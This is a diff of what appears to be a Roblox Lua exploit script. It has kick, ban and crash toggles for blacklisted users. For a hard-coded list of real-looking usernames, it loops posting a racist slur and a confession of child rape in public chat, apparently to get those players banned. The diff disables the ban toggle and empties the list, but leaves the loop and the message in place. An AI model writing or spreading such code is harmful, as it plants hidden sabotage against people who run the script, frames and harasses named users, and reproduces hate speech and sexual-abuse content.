@@ -4,7 +4,7 @@ local name = lplr.Name
 local delay = 10
 -----------------------------
 local KickBlacklistedUsersEnabled = false
-local BanBlacklistedUsersEnabled = true
+local BanBlacklistedUsersEnabled = false
 local CrashBlacklistedUsersEnabled = false
 local CrashAllIsActive = true
 local ScriptIsDisabled = false
@@ -18,7 +18,7 @@ if KickBlacklistedUsersEnabled then
 end
 -----------------------------
 if BanBlacklistedUsersEnabled then 
-    if name == "Frog_fury14" or name == "Starcode_Super1" or name == "PatriciaBenjamin9" or name == "tttertertert" or name == "dfstgrezuhdsregtjuyj" or name == "Iightnz" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" or name == "Iightnz" or name == "dfstgrezuhdsregtjuyj" then
+    if name == "" then
       while true do 
          task.wait(0.5)
          game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and i rape children", "All")
